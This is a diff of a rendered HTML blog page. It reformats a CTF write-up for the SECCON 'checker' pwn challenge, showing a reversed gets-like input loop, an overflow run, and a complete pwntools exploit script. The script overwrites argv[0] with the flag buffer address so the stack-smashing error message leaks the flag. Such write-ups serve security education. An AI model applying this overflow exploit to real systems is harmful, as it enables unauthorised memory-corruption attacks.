@@ -293,98 +293,93 @@ FLAG : asdf
 You are a liar...
 </code></pre></div></div>
 
-<p>By reversing the binary, we found that the program use a function named <code class="highlighter-rouge">getaline()</code> to read the user input.
-```c getaline
-while ( buf &amp;&amp; read(0, &amp;buf, 1uLL) )
-{
-    if ( buf == 10 )
-        buf = 0;
-    *(_BYTE *)(a1 + (signed int)v4++) = buf; // a1 = input buffer
-}</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>We can see that the `getaline()` function is just like `gets()` in `stdio.h`, so the program itself has multiple stack overflow vulnerabilities.   
-
+<p>By reversing the binary, we found that the program use a function named <code class="highlighter-rouge">getaline()</code> to read the user input.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">while</span> <span class="p">(</span> <span class="n">buf</span> <span class="o">&amp;&amp;</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">)</span> <span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">buf</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
+        <span class="n">buf</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v4</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// a1 = input buffer
+</span><span class="p">}</span>
 </code></pre></div></div>
-<p>$ ./checker
+<p>We can see that the <code class="highlighter-rouge">getaline()</code> function is just like <code class="highlighter-rouge">gets()</code> in <code class="highlighter-rouge">stdio.h</code>, so the program itself has multiple stack overflow vulnerabilities.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./checker
 Hello! What is your name?
-NAME : 123</p>
+NAME : 123
 
-<p>Do you know flag?</p>
-<blockquote>
-  <blockquote>
-    <p>yes</p>
-  </blockquote>
-</blockquote>
+Do you know flag?
+&gt;&gt; yes
 
-<p>Oh, Really??
+Oh, Really??
 Please tell me the flag!
 FLAG : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-You are a liar…
-<em>** stack smashing detected **</em>: ./checker terminated
-[1]    70548 abort      ./checker</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-Although we can easily overwrite the return address, however the program has the stack smashing protector (SSP) enabled. Luckliy, the program will read the flag's content and stored it into a buffer which lies in the `.bss` section before entering the main function. So, we can try to **overwrite the content of `argv[0]` ( which stores a `char*` pointer of the program file path ) into the flag buffer's address**. Then, we smash the stack and trigger the SSP, which will then output the following error message: 
+You are a liar...
+*** stack smashing detected ***: ./checker terminated
+[1]    70548 abort      ./checker
 </code></pre></div></div>
-<p><em>** stack smashing detected **</em>: [flag content] terminated</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-Notice that the original content of `argv[0]` stores a 6 bytes memory address, while the flag's buffer address is 3 bytes (`0x6010c0`). So we'll have to null out the `argv[0]` first before we change it into `0x6010c0`, or else it will crash the program before it was able to output the error message.  
-```python exp_checker.py
-#!/usr/bin/env python
 
-from pwn import *
-import subprocess
-import sys
-import time
+<p>Although we can easily overwrite the return address, however the program has the stack smashing protector (SSP) enabled. Luckliy, the program will read the flag’s content and stored it into a buffer which lies in the <code class="highlighter-rouge">.bss</code> section before entering the main function. So, we can try to <strong>overwrite the content of <code class="highlighter-rouge">argv[0]</code> ( which stores a <code class="highlighter-rouge">char*</code> pointer of the program file path ) into the flag buffer’s address</strong>. Then, we smash the stack and trigger the SSP, which will then output the following error message:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>*** stack smashing detected ***: [flag content] terminated
+</code></pre></div></div>
 
-HOST = "checker.pwn.seccon.jp"
-PORT = 14726
-ELF_PATH = "./checker"
-LIBC_PATH = ""
+<p>Notice that the original content of <code class="highlighter-rouge">argv[0]</code> stores a 6 bytes memory address, while the flag’s buffer address is 3 bytes (<code class="highlighter-rouge">0x6010c0</code>). So we’ll have to null out the <code class="highlighter-rouge">argv[0]</code> first before we change it into <code class="highlighter-rouge">0x6010c0</code>, or else it will crash the program before it was able to output the error message.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
 
-# setting 
-context.arch = 'amd64'
-context.os = 'linux'
-context.endian = 'little'
-context.word_size = 32
-# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
-context.log_level = 'INFO'
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
 
-elf = ELF(ELF_PATH)
-#libc = ELF(LIBC_PATH)
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"checker.pwn.seccon.jp"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">14726</span>
+<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./checker"</span>
+<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
 
-def my_recvuntil(s, delim):
-    res = ""
-    while delim not in res:
-        c = s.recv(1)
-        res += c
-        sys.stdout.write(c)
-        sys.stdout.flush()
-    return res
+<span class="c"># setting </span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
-def myexec(cmd):
-    return subprocess.check_output(cmd, shell=True)
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
+<span class="c">#libc = ELF(LIBC_PATH)</span>
+
+<span class="k">def</span> <span class="nf">my_recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">delim</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">while</span> <span class="n">delim</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">res</span> <span class="o">+=</span> <span class="n">c</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">res</span>
+
+<span class="k">def</span> <span class="nf">myexec</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
 
 
-if __name__ == "__main__":
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
-    r = remote(HOST, PORT)
-    #r = process(ELF_PATH)
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="c">#r = process(ELF_PATH)</span>
 
-    pad = 0x178
+    <span class="n">pad</span> <span class="o">=</span> <span class="mh">0x178</span>
 
-    r.sendlineafter(": ", "aaaa")
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="s">"aaaa"</span><span class="p">)</span>
     
-    # null out argv[0]
-    for i in xrange(8,-1,-1):
-        payload = "A"*pad + "B"*i
-        r.sendlineafter("&gt;&gt; ", payload)
+    <span class="c"># null out argv[0]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="n">pad</span> <span class="o">+</span> <span class="s">"B"</span><span class="o">*</span><span class="n">i</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
     
-    r.sendlineafter("&gt;&gt; ", "yes")
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt; "</span><span class="p">,</span> <span class="s">"yes"</span><span class="p">)</span>
 
-    # overwrite argv[0] to flag buffer
-    payload = "A"*pad + p64(0x6010c0)
+    <span class="c"># overwrite argv[0] to flag buffer</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="n">pad</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6010c0</span><span class="p">)</span>
     
-    r.sendlineafter(": ", payload)
-    r.interactive()
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
     
 </code></pre></div></div>
 
